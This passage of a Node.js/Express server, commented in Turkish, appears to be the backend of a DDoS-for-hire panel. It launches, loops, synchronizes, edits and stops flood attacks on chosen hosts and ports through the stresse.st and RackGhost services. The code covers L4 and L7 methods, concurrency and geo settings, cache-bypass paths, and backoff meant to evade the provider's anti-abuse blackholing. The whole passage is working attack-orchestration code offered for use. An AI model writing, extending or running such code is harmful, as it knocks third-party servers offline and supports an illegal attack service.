    console.log(`[loop ${loopId}] zaten tur calisiyor, bu atesleme atlaniyor`);
    return -1;
  }
  activeLoopRounds.add(loopId);
  try {
    return await fireLoopRoundInner(loopId, { skipDrain });
  } finally {
    activeLoopRounds.delete(loopId);
  }
}

async function fireLoopRoundInner(loopId, { skipDrain = false } = {}) {
  const loop = activeLoops[loopId];
  if (!loop || !loop.running) return 0;

  const session = sessions[loop.sessionId];
  const isRackghost = loop.params.provider === 'rackghost';
  if (!isRackghost && (!session || !session.apiToken)) {
    console.error(`[loop ${loopId}] API token bulunamadi, loop durduruluyor`);
    loop.stopReason = 'error';
    loop.stopDetail = 'API token bulunamadı (oturum kapanmış veya süresi dolmuş)';
    loop.running = false;
    saveState();
    cleanupLoop(loopId); // zombi birakma: history kapansin, kayitlar temizlensin
    loop.resolveFirstRound?.({ ok: false, permanent: true, message: loop.stopDetail });
    loop.resolveFirstRound = null;
    return 0;
  }

  console.log(`[loop ${loopId}] round baslatiliyor:`, JSON.stringify({
    host: loop.params.host,
    port: loop.params.port,
    method: loop.params.method,
    time: loop.syncTime || loop.params.time, // senkronlu loop'ta etkin sure senkron suresidir
    layer: loop.params.layer,
    concurrents: loop.params.concurrents,
    hasSession: !!session
  }));

  // Onceki turun saldirilari kendi time suresi doldugunda stresse.st tarafindan
  // otomatik sonlanir. Yeni tur baslatmadan once onceki turun dustugunu
  // dogrulariz (ID ile; ID yoksa imza ile) — boylece concurrent limitini asmayiz.
  // Senkron turlarda bekleme syncTick'in paralel fazinda toplu yapilir; burada
  // tekrar beklemek loop'lari sirayla kilitleyip hizayi bozar (skipDrain).
  const previousRoundIds = loop.roundAttackIds || [];
  if (isRackghost) {
    if (previousRoundIds.length > 0 && !skipDrain) {
      // RackGhost saldirilari 'time' dolunca kesin sonlanir; onceki turun
      // dustugunu ongoing ile yoklamak gereksiz istek trafigidir (2+ loop'ta
      // 1 istek/sn rate limit'ine dayaniyordu). Statik kisa buffer yeterli.
      console.log(`[loop ${loopId}] rackghost: onceki tur buffer bekleniyor (3sn)`);
      await new Promise((r) => setTimeout(r, 3000));
    }
  } else if (!skipDrain) {
    await waitLoopsDrained([loopId], 60000);
  }
  previousRoundIds.forEach((attackId) => unregisterAttack(attackId));

  loop.roundCount += 1;
  loop.lastRoundAt = new Date().toISOString();
  const round = loop.roundCount;

  // Senkronlu loop'larin saldiri suresi senkron suresidir (kullanici secti);
  // boylece grup gercekten ayni anda baslayip ayni anda biter.
  const effectiveParams = loop.syncTime ? { ...loop.params, time: loop.syncTime } : loop.params;

  // Yeni tur ID'lerini temizle
  loop.roundAttackIds = [];

  let roundSuccesses = 0;
  let roundError = null;

  // Tek istekte istenen concurrents kadar saldiri baslat.
  // Gelen attack_id'lerden sadece onceki /ongoing'de olmayan yeni ID'leri kaydet.
  try {
    let data, attackIds, elapsedSec;
    if (loop.params.provider === 'rackghost') {
      // RackGhost: stresse launch akisindan bagimsiz, dogrudan adapter uzerinden.
      const rgResult = await rackghost.startAttack({
        host: effectiveParams.host,
        port: effectiveParams.port,
        time: effectiveParams.time,
        concurrents: effectiveParams.concurrents,
        method: effectiveParams.method
      });
      data = { status: 'success' };
      attackIds = rgResult.attackIds;
      elapsedSec = 0;
      // RackGhost slots alanini ID->slots haritasina cevir (kayit concurrents icin).
      // start yaniti carpanli methodlarda dusuk bildirebilir; upstream ongoing
      // tuketimi gosterir. Titreme olmamasi icin max(bildirilen, girilen x carpan).
      var rgSlotsById = {};
      const rgMult = rackghost.slotMultiplier(loop.params.method);
      (rgResult.raw || []).forEach((it) => {
        rgSlotsById[String(it.id)] = Math.max(parseInt(it.slots, 10) || 1, (loop.params.concurrents || 1) * rgMult);
      });
    } else {
      ({ data, attackIds, elapsedSec } = await launchAttacksGet(loop.sessionId, effectiveParams, effectiveParams.concurrents, loopId));
    }
    if (attackIds.length > 0) {
      roundSuccesses = attackIds.length;
      loop.roundAttackIds = attackIds;
      attackIds.forEach((attackId) => {
        const slots = isRackghost && typeof rgSlotsById !== 'undefined' ? (rgSlotsById[String(attackId)] || 1) : 1;
        registerAttack(attackId, loop.sessionId, effectiveParams, loopId, slots, elapsedSec || 0);
      });
      const successCount = isRackghost && typeof rgSlotsById !== 'undefined'
        ? Object.values(rgSlotsById).reduce((a, b) => a + b, 0)
        : attackIds.length;
      console.log(`[loop ${loopId}] round ${round} basarili: ${successCount} saldiri (istenen: ${loop.params.concurrents})`);
      // 2x methodlarda (HTTP-REST) upstream'e yarisi gonderilir; beklenti esigi
      // gonderilen degerdir, kullanicinin girdigi degil.
      const expectedLaunch = isRackghost
        ? (parseInt(loop.params.concurrents, 10) || 1)
        : stresseSendConc(loop.params.method, effectiveParams.concurrents);
      if (successCount !== expectedLaunch) {
        console.warn(`[loop ${loopId}] round ${round} UYARI: ${isRackghost ? 'rackghost' : 'stresse.st'} ${expectedLaunch} yerine ${successCount} attackId dondurdu`);
      }
    } else if (data?.status === 'success' || data?.message === 'Attack started') {
      // Dogrulanamayan basari: stresse.st success diyor ama /ongoing JSON'u bu
      // method icin guvenilir degil (saldiri web panelinde var, listede yok).
      // Loop'u oldurmek yerine turu basarili say; uyari panelde gorunsun.
      roundSuccesses = parseInt(effectiveParams.concurrents, 10) || 1;
      loop.roundAttackIds = [];
      loop.unverifiedRounds = (loop.unverifiedRounds || 0) + 1;
      if (data?.sigRecovered) {
        // Imza kurtarma: timeout/5xx sonrasi saldirilarin upstream'te oldugu
        // satir sayisiyla dogrulandi — yanlis uyari basma.
        loop.lastError = null;
        console.log(`[loop ${loopId}] round ${round} imza ile dogrulandi (upstream'te satir var; timeout/5xx idi)`);
      } else {
        loop.lastError = 'Uyari: stresse.st "Attack started" dondu ancak saldiri /ongoing\'de dogrulanamadi';
        console.warn(`[loop ${loopId}] round ${round} dogrulanamadi (success ama ID yok); loop calismaya devam ediyor (${loop.unverifiedRounds}. dogrulanamayan tur)`);
      }
    } else {
      roundError = new Error(`GET /api basarisiz: ${data?.message || 'attackId bulunamadi'}`);
      console.error(`[loop ${loopId}] round ${round} hata:`, roundError.message);
    }
  } catch (err) {
    roundError = err;
    console.error(`[loop ${loopId}] round ${round} hata:`, err.message);
  }

  if (roundSuccesses === 0) {
    loop.errors += 1;
    loop.consecutiveErrors = (loop.consecutiveErrors || 0) + 1;
    // Upstream'in gercek mesajini yakala (axios hatasinda response.data'da durur)
    const upstreamMsg = normalizeUpstreamError(roundError?.response?.data?.message || roundError?.message || 'Bilinmeyen hata');
    loop.lastError = upstreamMsg;
    console.error(`[loop ${loopId}] round ${round} tamamen basarisiz (${loop.consecutiveErrors}/${MAX_LOOP_CONSECUTIVE_ERRORS}): ${upstreamMsg}`);
    // Method bakimda gibi kalici hatalarda 10 tur beklemek anlamsiz; hemen durdur.
    if (/under maintenance/i.test(upstreamMsg)) {
      console.error(`[loop ${loopId}] Kalici upstream hatasi (method bakimda), loop durduruluyor`);
      loop.stopReason = 'error';
      loop.stopDetail = `stresse.st method'u bakıma aldı (${upstreamMsg})`;
      loop.running = false;
      cleanupLoop(loopId); // zombi birakma (senkron loop'lar kuyruk finally'sine hic girmez)
    } else if (loop.consecutiveErrors >= MAX_LOOP_CONSECUTIVE_ERRORS) {
      console.error(`[loop ${loopId}] Cok fazla hata, loop otomatik durduruluyor`);
      loop.stopReason = 'error';
      loop.stopDetail = `${MAX_LOOP_CONSECUTIVE_ERRORS} ardışık başarısız tur (son: ${upstreamMsg})`;
      loop.running = false;
      cleanupLoop(loopId);
    }
  } else {
    loop.consecutiveErrors = 0;
    loop.lastError = null;
    // Basarili tur sonrasi loop history'sinin expiresAt'ini uzat; yoksa cleanup
    // uzun suren loop'larda kaydi erken "completed" isaretleyebilir.
    if (loop.historyId && attackHistory[loop.historyId]) {
      attackHistory[loop.historyId].expiresAt = new Date(Date.now() + (parseInt(effectiveParams.time, 10) || 0) * 1000).toISOString();
    }
  }

  return roundSuccesses;
}

// Loop'un kendi saatiyle calisan tur dongusu (senkron disi): cekirdek turu
// atesler, ilk-tur sonucunu bildirir, time + backoff bekler.
async function runLoopRound(loopId) {
  const loop = activeLoops[loopId];
  const roundSuccesses = await fireLoopRound(loopId);
  // -1 = baska bir yol (senkron) su an tur calistiriyor; hata sayma, sus.
  if (roundSuccesses === -1) return;

  // /loop endpoint'i ilk turun launch sonucunu bekliyor olabilir; kalici
  // hatalarda loop olusumu bastan reddedilsin diye sonucu bildir.
  if (loop && loop.resolveFirstRound) {
    const errText = loop.lastError || '';
    // Slot limiti gibi tekrar denemeyle duzelmeyecek hatalar kalici sayilir;
    // loop hic olusmasin, kullanici gercek sebebi baslatma aninda gorsun.
    const permanent = !loop.running
      || /under maintenance|slot limiti|reached the limit|en fazla/i.test(errText);
    if (roundSuccesses === 0 && permanent && loop.running) {
      loop.stopReason = 'error';
      loop.stopDetail = errText || 'İlk tur başarısız';
      loop.running = false;
      saveState();
    }
    loop.resolveFirstRound({
      ok: roundSuccesses > 0,
      permanent: roundSuccesses === 0 && permanent,
      message: roundSuccesses > 0 ? null : (errText || 'Tur başarısız')
    });
    loop.resolveFirstRound = null;
  }

  // Saldiri stresse.st uzerinde time saniye surer; loop'un siradaki turu
  // icin saldiri bitene kadar bekle. Kullanici durdurursa erken cik.
  const waitUntil = Date.now() + (loop.params.time * 1000);
  while (loop.running && Date.now() < waitUntil) {
    await new Promise(r => setTimeout(r, 1000));
  }

  // Basarisiz tur sonrasi ustel backoff: stresse.st anti-abuse'i IP'yi gecici
  // blackhole'a alabiliyor; hizli retry firtinasi bunu tetikleyip uzatiyor.
  // Ard arda hata varsa her tur 30sn x hataSayisi (max 3dk) ek bekleme.
  if (roundSuccesses === 0 && loop.running) {
    const backoffMs = Math.min(loop.consecutiveErrors || 1, 6) * 30000;
    console.warn(`[loop ${loopId}] basarisiz tur backoff: ${backoffMs / 1000}sn bekleniyor`);
    const backoffUntil = Date.now() + backoffMs;
    while (loop.running && Date.now() < backoffUntil) {
      await new Promise(r => setTimeout(r, 1000));
    }
  }

  // Sonsuz loop degilse bu tek turdu, loop'u durdur
  if (!loop.params.infinite) {
    loop.running = false;
  }

  saveState();
}

function cleanupLoop(loopId) {
  const finishedLoop = activeLoops[loopId];
  if (finishedLoop?.historyId && attackHistory[finishedLoop.historyId]) {
    if (attackHistory[finishedLoop.historyId].status === 'active') {
      updateAttackHistoryStatus(finishedLoop.historyId, 'completed');
    }
  }
  // Bu loop'a ait SURESİ DOLMUS attack kayitlarini temizle. Hala calisan
  // saldirilara dokunma: loop "Cikar" ile durduruldugunda turu ucusda olan
  // saldirilar upstream'te surmeye devam eder; kayitlari erken silinirse
  // panelden/Etki Monitoru'nden duser, history zinciri bozulur. Calisan
  // kayitlar dogal bitiste cleanupExpiredAttacks tarafindan temizlenir.
  const now = Date.now();
  let removed = 0;
  Object.keys(activeAttacks).forEach((attackId) => {
    const a = activeAttacks[attackId];
    if (a.loopId !== loopId) return;
    const exp = new Date(a.expiresAt || 0).getTime();
    if (exp <= now) {
      delete activeAttacks[attackId];
      removed++;
    }
  });
  delete activeLoops[loopId];
  saveState();
  console.log(`[loop ${loopId}] temizlendi (${removed} pending kayit silindi)`);
  // Loop dogal olarak bitti (round'lar tamamlandi) veya hata nedeniyle durdu;
  // Telegram bildirimini buna gore gonder.
  notifyLoopRemoved(finishedLoop, finishedLoop?.stopReason === 'error' ? 'durduruldu' : 'tamamlandi', { stopDetail: finishedLoop?.stopDetail });
  checkSlotsEmpty();
}

/**
 * POST /api/stresse/loop
 * Body: { loopId, host, port, time, method, subnet, geo, concurrents, interval, infinite }
 *
 * Non-blocking: loop'u baslatir ve hemen loopId doner. Loop arka planda calisir.
 */
app.post('/api/stresse/loop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { port, time, method, subnet = '32', geo = 'worldwide', concurrents = 1, interval = 5, infinite = false, layer = 'L4' } = req.body;
    const note = sanitizeNote(req.body.note);
    const rawHost = req.body.host;
    const provider = req.body.provider === 'rackghost' ? 'rackghost' : 'stresse';
    // L7'de path/query korunur (cache-bypass); L4'te bare host zorunlu.
    const host = layer === 'L7' ? normalizeL7Host(rawHost) : normalizeHost(rawHost);
    if (!host || !port || !time || !method) {
      return res.status(400).json({ status: 'error', message: 'host, port, time and method required' });
    }
    // Loop ID'yi normalize edilmis host uzerinden backend uretir; frontend'in URL protokolu iceren
    // loop ID'leri gecersiz olur. Frontend response'taki loopId'yi kullanir.
    // Sorgulu L7 hedeflerinde query ID'ye girmesin diye bare host kullanilir.
    const loopId = `${normalizeHost(rawHost) || host}:${port}_${method}_${Date.now()}`;
    console.log(`[loop/create] ${host}:${port} ${method} layer=${layer} time=${time} concurrents=${concurrents} interval=${interval} provider=${provider}`);

    if (provider === 'stresse' && isFreeMethod(method)) {
      return res.status(403).json({ status: 'error', message: 'FREE methodlar bu panelde kullanilamaz' });
    }

    // RackGhost limitleri (stresse plan limiti bu provider'a uygulanmaz)
    if (provider === 'rackghost') {
      if (parseInt(concurrents) > rackghost.LIMITS.maxConcurrents) {
        return res.status(400).json({ status: 'error', message: `RackGhost maksimum concurrent ${rackghost.LIMITS.maxConcurrents}` });
      }
      if (parseInt(time) > rackghost.LIMITS.maxTime) {
        return res.status(400).json({ status: 'error', message: `RackGhost maksimum süre ${rackghost.LIMITS.maxTime} saniye` });
      }
    }

    // Mukerrer loop engeli: ayni hedef+port+method+layer icin calisan loop
    // varsa ikincisini baslatma (cift tiklama / ilk tur beklerken tekrar
    // basma ile olusan mukerrer loop'lar birikim yaratiyordu).
    const methodLower = String(method).toLowerCase();
    const bareHost = normalizeHost(rawHost) || host;
    const duplicate = Object.values(activeLoops).find((l) => l.running
      && (normalizeHost(l.params?.host) || l.params?.host) === bareHost
      && parseInt(l.params?.port) === parseInt(port)
      && String(l.params?.method || '').toLowerCase() === methodLower
      && (l.params?.layer || 'L4') === layer);
    if (duplicate) {
      return res.status(409).json({ status: 'error', message: 'Bu hedef ve yöntem için zaten aktif bir loop çalışıyor' });
    }

    const minTime = getMinTime(method, layer);
    if (parseInt(time) < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum süre ${minTime} saniye (${method})` });
    }

    if (provider === 'stresse') {
      const planCheck = checkPlanLimits(sessionId, time, concurrents);
      if (!planCheck.ok) {
        return res.status(403).json({ status: 'error', message: planCheck.message });
      }
    }

    // Loop saldirisini history'ye sadece bir kez kaydet
    const historyId = addAttackHistory(sessionId, { host, port, method, time, layer, note }, {
      loop: true,
      concurrents: parseInt(concurrents),
      historyId: `hist_loop_${loopId}`
    });

    activeLoops[loopId] = {
      running: true,
      sessionId,
      owner: sessions[sessionId]?.username || null,
      historyId,
      schemaVersion: 1,
      // Not, params ICINDE tutulmaz: loop.params dogrudan stresse.st API
      // cagrisina spread ediliyor, notun upstream'e sizmamasi icin ayri alan.
      note,
      // Grup (opsiyonel): yoksa olusturulur, loop ona dahil olur
      group: resolveGroupName(req.body.group, sessions[sessionId]?.username) || undefined,

      params: { host, port: parseInt(port), time: parseInt(time), method: provider === 'rackghost' ? String(method).toUpperCase() : method.toLowerCase(), subnet, geo, concurrents: parseInt(concurrents), interval: parseInt(interval), infinite, layer, provider },
      displayTarget: layer === 'L7' ? host : `${host}:${port}`,
      startedAt: new Date().toISOString(),
      lastRoundAt: null,
      roundCount: 0,
      errors: 0,
      roundAttackIds: []
    };

    // Ilk turun launch sonucunu bekle: method bakimda gibi kalici hatalarda
    // loop hic olusmasin, panel "Loop baslatildi" yerine gercek hatayi gostersin.
    const firstRoundResult = new Promise((resolve) => {
      activeLoops[loopId].resolveFirstRound = resolve;
    });
    runLoop(loopId).catch((err) => console.error(`[loop ${loopId}] runLoop beklenmeyen hata:`, err));

    // Aski ihtimaline karsi guvenlik suresi; asarsa eski davranis (aninda basarili)
    const outcome = await Promise.race([
      firstRoundResult,
      new Promise((r) => setTimeout(() => r({ ok: true, timeout: true }), 75000))
    ]);

    if (!outcome.ok && outcome.permanent) {
      delete activeLoops[loopId];
      saveState();
      return res.status(502).json({ status: 'error', message: outcome.message });
    }

    res.json({ status: 'success', loopId, message: 'Loop baslatildi' });
    saveState();
  } catch (error) {
    handleEndpointError(res, error, 'Loop error');
  }
});

/**
 * POST /api/stresse/stop
 * Body: { id }
 */
app.post('/api/stresse/stop', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const { id } = req.body;
    if (!id) return res.status(400).json({ status: 'error', message: 'id required' });
    // Pending satir: launch yeni gitti, upstream ID'si henuz yok — durdurulamaz.
    if (String(id).startsWith('pending_')) {
      return res.status(409).json({ status: 'error', message: 'Saldırı henüz başlatılıyor; birkaç saniye sonra tekrar dene' });
    }

    // Baska hesaba ait saldiri durdurulamaz: upstream stop atma, kayitlara dokunma.
    // Yerel kayit yoksa (panel disindan baslatilmis olabilir) durdurmaya izin ver.
    if (activeAttacks[id] && activeAttacks[id].username !== sessionUser) {
      return res.status(403).json({ status: 'error', message: 'Bu saldırı sizin hesabınıza ait değil' });
    }

    // Durdurulan saldiri hangi loop'a ait tespit et ve round listesinden cikar.
    // Sadece istegi yapan hesaba ait loop'lara dokun.
    let affectedLoopKey = null;
    Object.keys(activeLoops).forEach((key) => {
      const loop = activeLoops[key];
      if (getLoopOwner(loop) !== sessionUser) return;
      if (loop?.roundAttackIds?.includes(id)) {
        affectedLoopKey = key;
        loop.roundAttackIds = loop.roundAttackIds.filter((attackId) => attackId !== id);
        console.log(`[stop] Loop roundundan attack ${id} cikarildi: ${key}`);
      }
    });
    saveState();

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    const apiClient = getApiClient(sessionId);
    const response = await stopAttackApi(apiClient, session.apiToken, id);

    // Durdurulan saldiriyi kayittan sil
    const attackRecord = activeAttacks[id];
    const loopIdOfAttack = attackRecord?.loopId || affectedLoopKey;
    unregisterAttack(id);

    // Loop'a ait saldiri manuel durdurulduysa loop'u da durdur; aksi halde
    // loop sonraki turda ayni hedefi yeniden baslatir ve satir panele geri gelir.
    if (loopIdOfAttack && activeLoops[loopIdOfAttack]?.running
        && getLoopOwner(activeLoops[loopIdOfAttack]) === sessionUser) {
      const stoppedLoop = activeLoops[loopIdOfAttack];
      stoppedLoop.running = false;
      delete activeLoops[loopIdOfAttack];
      saveState();
      console.log(`[stop] Loop'a ait saldiri durduruldugu icin loop da durduruldu: ${loopIdOfAttack}`);
      notifyLoopRemoved(stoppedLoop, 'durduruldu', {
        username: sessions[sessionId]?.username,
        ip: getClientIp(req),
        stopDetail: 'Loop saldırısı panelden durduruldu'
      });
    }

    // History durumunu guncelle
    const history = findActiveHistoryByAttackId(id);
    if (history && !history.loop) {
      // Sadece normal saldirilarin history'si durduruldu olarak isaretlenir.
      updateAttackHistoryStatus(history.historyId, 'stopped');
    }

    // Eger durdurulan saldiri bir loop'a aitse ve o loop artik aktif degilse,
    // loop history'sini durduruldu olarak isaretle (kullanici loop modundan cikarilmis
    // loop'un saldirilarini tek tek durduruyor demektir).
    if (loopIdOfAttack && !activeLoops[loopIdOfAttack]) {
      const loopHistoryId = `hist_loop_${loopIdOfAttack}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    }

    res.json(response);
  } catch (error) {
    handleEndpointError(res, error, 'Stop error');
  }
});

/**
 * POST /api/stresse/stop/bulk
 * Body: { ids: [id1, id2, ...], batchSize?: number, delayMs?: number, concurrency?: number }
 *
 * API key ile ID'leri kucuk gruplara ayirir; her grup icindeki istekleri
 * sinirli concurrency ile paralel atar. Bu sayede cok sayida
 * saldiriyi hizli ve rate limit riskini azaltarak durdurur.
 */
app.post('/api/stresse/stop/bulk', async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const { ids, batchSize = 10, delayMs = 500, concurrency = 5 } = req.body;
    if (!Array.isArray(ids) || ids.length === 0) {
      return res.status(400).json({ status: 'error', message: 'ids array required' });
    }

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const session = sessions[sessionId];
    if (!session || !session.apiToken) {
      return res.status(401).json({ status: 'error', message: 'API token not available, please login again' });
    }

    // Baska hesaba ait saldirilari atla: upstream stop atma, unregister yapma.
    // Yerel kaydi olmayan ID'lere (panel disindan baslatilmis olabilir) izin ver.
    const allowedIds = [];
    const skippedIds = [];
    ids.forEach((id) => {
      if (activeAttacks[id] && activeAttacks[id].username !== sessionUser) {
        skippedIds.push(id);
      } else {
        allowedIds.push(id);
      }
    });

    const size = Math.max(1, Math.min(parseInt(batchSize) || 10, 20));
    const delay = Math.max(0, Math.min(parseInt(delayMs) || 500, 5000));
    const concurrent = Math.max(1, Math.min(parseInt(concurrency) || 5, 10));

    const apiClient = getApiClient(sessionId);
    const results = [];
    const totalBatches = Math.ceil(allowedIds.length / size);

    // Her ID'nin ait oldugu loop'u onceden tespit et (round listesi veya kayit).
    // Batch dongusunde round listeleri temizlendigi icin once bakmak gerek.
    // Sadece istegi yapan hesaba ait loop'lar kapsanir.
    const affectedLoopKeys = new Set();
    allowedIds.forEach((id) => {
      Object.keys(activeLoops).forEach((key) => {
        const loop = activeLoops[key];
        if (getLoopOwner(loop) !== sessionUser) return;
        if (loop?.roundAttackIds?.includes(id)) affectedLoopKeys.add(key);
      });
      const recordLoopId = activeAttacks[id]?.loopId;
      if (recordLoopId && getLoopOwner(activeLoops[recordLoopId]) === sessionUser) {
        affectedLoopKeys.add(recordLoopId);
      }
    });

    const stopSingle = async (id) => {
      try {
        const response = await stopAttackApi(apiClient, session.apiToken, id);
        return { id, status: 'success', data: response };
      } catch (err) {
        return { id, status: 'error', message: err.message, data: err.response?.data };
      }
    };

    const runWithConcurrency = async (items, fn, limit) => {
      const out = [];
      for (let i = 0; i < items.length; i += limit) {
        const chunk = items.slice(i, i + limit);
        const chunkResults = await Promise.all(chunk.map(fn));
        out.push(...chunkResults);
        if (i + limit < items.length) {
          await new Promise((r) => setTimeout(r, 200));
        }
      }
      return out;
    };

    for (let i = 0; i < allowedIds.length; i += size) {
      const batch = allowedIds.slice(i, i + size);
      const currentBatch = Math.floor(i / size) + 1;

      const batchResults = await runWithConcurrency(batch, stopSingle, concurrent);
      results.push(...batchResults);

      // Sadece upstream'in basariyla durdurdugu ID'leri loop round
      // listelerinden cikar; reddedilenler listede kalsin.
      const batchStopped = new Set(
        batchResults.filter((r) => r.status === 'success').map((r) => String(r.id))
      );
      batch.forEach((id) => {
        if (!batchStopped.has(String(id))) return;
        Object.keys(activeLoops).forEach((key) => {
          const loop = activeLoops[key];
          if (getLoopOwner(loop) !== sessionUser) return;
          if (loop?.roundAttackIds?.includes(id)) {
            loop.roundAttackIds = loop.roundAttackIds.filter((attackId) => attackId !== id);
            console.log(`[stop/bulk] Loop ${key} roundundan attack ${id} cikarildi`);
          }
        });
      });
      saveState();

      // Son batch degilse kisa bir bekleme (rate limit korumasi)
      if (currentBatch < totalBatches) {
        await new Promise((r) => setTimeout(r, delay));
      }
    }

    // Atlanan (baska hesaba ait) ID'leri sonuca 'skipped' olarak isaretle.
    skippedIds.forEach((id) => {
      results.push({ id, status: 'skipped', message: 'Bu saldırı sizin hesabınıza ait değil' });
    });

    // Loop'a ait saldirilar manuel durdurulduysa ilgili loop'lari da durdur;
    // aksi halde loop sonraki turda ayni hedefleri yeniden baslatir ve
    // satirlar panele geri gelir. Loop'lar, asagidaki unregister/history
    // akisindan once durdurulur ki loop history'leri 'stopped' isaretlenebilsin.
    affectedLoopKeys.forEach((key) => {
      const loop = activeLoops[key];
      if (loop?.running) {
        loop.running = false;
        delete activeLoops[key];
        console.log(`[stop/bulk] Loop'a ait saldiri durduruldugu icin loop da durduruldu: ${key}`);
        notifyLoopRemoved(loop, 'durduruldu', {
          username: sessions[sessionId]?.username,
          ip: getClientIp(req),
          stopDetail: 'Loop saldırıları panelden toplu durduruldu'
        });
      }
    });
    saveState();

    // Durdurulan tum ID'leri kayittan sil ve history'yi guncelle.
    // Sadece upstream'in BASARILI durdurdugu ID'ler silinir; upstream'in
    // reddettigi ID'ler kayitta kalir (hayalet saldiri olusmasin).
    // Atlanan (baska hesaba ait) ID'lere dokunma.
    const upstreamStopped = new Set(
      results.filter((r) => r.status === 'success').map((r) => String(r.id))
    );
    const stoppedLoopIds = new Set();
    allowedIds.forEach((id) => {
      if (!upstreamStopped.has(String(id))) return;
      const attackRecord = activeAttacks[id];
      const loopIdOfAttack = attackRecord?.loopId;
      unregisterAttack(id);
      const history = findActiveHistoryByAttackId(id);
      if (history && !history.loop) {
        updateAttackHistoryStatus(history.historyId, 'stopped');
      }
      if (loopIdOfAttack && !activeLoops[loopIdOfAttack]) {
        stoppedLoopIds.add(loopIdOfAttack);
      }
    });

    // Loop modu sonlandirilmis ve kullanici o loop'un saldirilarini tek tek
    // veya toplu durdurursa, loop history'sini durduruldu olarak isaretle.
    // affectedLoopKeys: kayitta olmayan ID'ler uzerinden etkilenen loop'lari da kapsar.
    new Set([...stoppedLoopIds, ...affectedLoopKeys]).forEach((loopId) => {
      const loopHistoryId = `hist_loop_${loopId}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    });

    res.json({ status: 'success', total: ids.length, stopped: allowedIds.length, skipped: skippedIds.length, results });
  } catch (error) {
    handleEndpointError(res, error, 'Bulk stop error');
  }
});

/**
 * POST /api/stresse/loop/stop
 * Body: { loopId }
 */
/**
 * PUT /api/stresse/loop/edit
 * Body: { loopId, note?, time?, interval?, concurrents? }
 * Calisan loop'un notunu ve/veya saldiri ayarlarini gunceller. Yeni degerler
 * bir SONRAKI turdan itibaren gecerlidir; o an calisan tur etkilenmez.
 */
// LiteSpeed ModSecurity PUT/DELETE'i kestigi icin POST da kabul ediyoruz.
const loopEditHandler = async (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });

    const sessionUser = sessions[sessionId]?.username;
    if (!sessionUser) {
      return res.status(401).json({ status: 'error', message: 'Session user not found' });
    }

    const { loopId } = req.body;
    const loop = activeLoops[loopId];
    if (!loop || getLoopOwner(loop) !== sessionUser) {
      return res.status(404).json({ status: 'error', message: 'Loop bulunamadi' });
    }

    const p = loop.params || {};
    const newTime = req.body.time !== undefined ? parseInt(req.body.time, 10) : parseInt(p.time, 10);
    const newInterval = req.body.interval !== undefined ? parseInt(req.body.interval, 10) : parseInt(p.interval, 10);
    const newConcurrents = req.body.concurrents !== undefined ? parseInt(req.body.concurrents, 10) : parseInt(p.concurrents, 10);
    // Geo: sadece stresse.st'in destekledigi degerler kabul edilir
    const VALID_GEO = ['worldwide', 'china', 'russia', 'brazil', 'korea', 'turkey', 'thailand', 'japan', 'vietnam', 'indonesia', 'iran'];
    const newGeo = req.body.geo !== undefined ? String(req.body.geo).toLowerCase() : (p.geo || 'worldwide');
    if (!VALID_GEO.includes(newGeo)) {
      return res.status(400).json({ status: 'error', message: 'Gecersiz geo degeri' });
    }

    if (!Number.isFinite(newTime)) {
      return res.status(400).json({ status: 'error', message: 'Gecersiz sure' });
    }
    const minTime = getMinTime(p.method, p.layer || 'L4');
    if (newTime < minTime) {
      return res.status(400).json({ status: 'error', message: `Minimum sure ${minTime} saniye (${String(p.method || '').toUpperCase()})` });
    }
    if (!Number.isFinite(newConcurrents) || newConcurrents < 1) {
      return res.status(400).json({ status: 'error', message: 'Concurrents en az 1 olmali' });
    }
    if (!Number.isFinite(newInterval) || newInterval < 0) {
      return res.status(400).json({ status: 'error', message: 'Bekleme 0 veya daha buyuk olmali' });
    }

    // Provider'a gore limit dogrulamasi: rackghost loop'ta stresse plani
    // uygulanmaz; rackghost LIMITS + slot carpani (girilen x carpan) gecerli.
    if (p.provider === 'rackghost') {
      const rgMult = rackghost.slotMultiplier(p.method);
      if (newConcurrents * rgMult > rackghost.LIMITS.maxConcurrents) {
        return res.status(403).json({ status: 'error', message: rgMult > 1
          ? `RackGhost: bu method ${rgMult}x slot tüketir; en fazla ${Math.floor(rackghost.LIMITS.maxConcurrents / rgMult)} girebilirsiniz.`
          : `RackGhost: en fazla ${rackghost.LIMITS.maxConcurrents} concurrent girebilirsiniz.` });
      }
      if (newTime > rackghost.LIMITS.maxTime) {
        return res.status(403).json({ status: 'error', message: `RackGhost maksimum süre ${rackghost.LIMITS.maxTime} saniye` });
      }
    } else {
      const planCheck = checkPlanLimits(sessionId, newTime, newConcurrents, loopId);
      if (!planCheck.ok) {
        return res.status(403).json({ status: 'error', message: planCheck.message });
      }
    }

    p.time = newTime;
    p.interval = newInterval;
    p.concurrents = newConcurrents;
    p.geo = newGeo;

    if (req.body.note !== undefined) {
      const note = sanitizeNote(req.body.note);
      loop.note = note;
      const hist = loop.historyId ? attackHistory[loop.historyId] : null;
      if (hist && hist.status === 'active') hist.note = note;
    }

    // Grup islemleri: group alani geldiyse (string) gruba ata/olustur,
    // grupCikar=true ise gruptan cikar. Ikisi birlikte gelmez.
    if (req.body.grupCikar === true) {
      delete loop.group;
    } else if (req.body.group !== undefined) {
      const g = resolveGroupName(req.body.group, sessionUser);
      if (g) loop.group = g; else delete loop.group;
    }

